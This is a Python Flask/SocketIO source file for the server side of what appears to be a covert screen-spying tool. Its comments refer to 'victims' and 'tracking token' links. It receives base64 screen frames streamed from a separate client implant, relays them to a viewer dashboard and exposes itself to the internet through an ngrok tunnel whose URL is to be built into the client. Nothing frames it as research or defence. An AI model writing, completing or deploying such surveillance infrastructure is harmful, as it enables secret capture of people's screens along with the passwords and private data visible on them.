import random
import string
import logging
from flask import Flask, request, render_template
from flask_socketio import SocketIO, join_room, emit
from pyngrok import ngrok

# Initialize Flask and SocketIO
app = Flask(__name__)
app.config['SECRET_KEY'] = 'super_secret_remote_key_123'
socketio = SocketIO(app, cors_allowed_origins="*")

# Suppress standard Flask logging for cleaner output
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# Global state to track connected victims
connected_clients = {}
casters = {} # sid mapping

@app.route('/')
def index():
    return "<h1>Remote Control Server is Active</h1><p>Waiting for connections...</p>"

@app.route('/sharing')
def sharing():
    """
    This endpoint mimics the link you provided:
    https://<server_ip>/sharing?c=token
    """
    client_id = request.args.get('c')
    
    if not client_id:
        return "Invalid Link. Missing tracking token (?c=)", 400
        
    # Render the viewer template, passing the client_id to the webpage
    return render_template('viewer.html', client_id=client_id)

@app.route('/dashboard')
def dashboard():
    """
    Admin Dashboard to view all currently active screen sessions.
    """
    return render_template('dashboard.html', clients=connected_clients)

# ---------------------------------------------------------
# WebSockets: Handling Client Screen Capture (The "Sender")
# ---------------------------------------------------------
@socketio.on('caster_connect')
def handle_caster_connect(data):
    client_id = data.get('client_id')
    if client_id:
        join_room(f"host_{client_id}")
        casters[request.sid] = client_id
        connected_clients[client_id] = {
            'ip': request.remote_addr,
            'status': 'Online Streaming'
        }
        print(f"[+] Client tracking session connected successfully! Session Token: {client_id[:15]}...")

@socketio.on('disconnect')
def handle_disconnect():
    if request.sid in casters:
        client_id = casters.pop(request.sid)
        if client_id in connected_clients:
            connected_clients.pop(client_id)
        print(f"[-] Client {client_id[:15]}... disconnected.")

@socketio.on('video_frame')
def handle_video_frame(data):
    """
    Receives base64 image frames from the Client (the victim/sender)
    and broadcasts them to anyone viewing this specific session id.
    """
    client_id = data.get('client_id')
    frame = data.get('frame')
    if client_id and frame:
        # Broadcast the frame to everyone in the "viewer_CLIENTID" room
        emit('new_frame', {'frame': frame}, room=f"viewer_{client_id}")

# ---------------------------------------------------------
# WebSockets: Handling Browser Viewers (The "Watcher")
# ---------------------------------------------------------
@socketio.on('viewer_connect')
def handle_viewer_connect(data):
    client_id = data.get('client_id')
    if client_id:
        join_room(f"viewer_{client_id}")
        print(f"[*] A browser viewer connected to monitor session: {client_id[:15]}...")

if __name__ == '__main__':
    print("==================================================")
    print("   REMOTE CONTROL CENTRAL SERVER INITIALIZED      ")
    print("==================================================")
    print("Running locally on http://127.0.0.1:5000")
    
    # Start Ngrok Tunnel
    try:
        public_url = ngrok.connect(5000).public_url
        print("\n" + "*"*60)
        print(">>> PUBLIC INTERNET TUNNEL ESTABLISHED <<<")
        print(f"YOUR GLOBAL SERVER URL IS: {public_url}")
        print("*"*60 + "\n")
        print("IMPORTANT: Copy this URL and paste it into client.py before building!")
    except Exception as e:
        print("\n[!] Could not start Ngrok. Are you running this for the first time?")
        print("[!] You may need to add your auth token: `ngrok config add-authtoken <TOKEN>`")
        print("Error details:", e)

    print("\nWaiting for clients to connect...\n")
    socketio.run(app, host='127.0.0.1', port=5000, allow_unsafe_werkzeug=True)
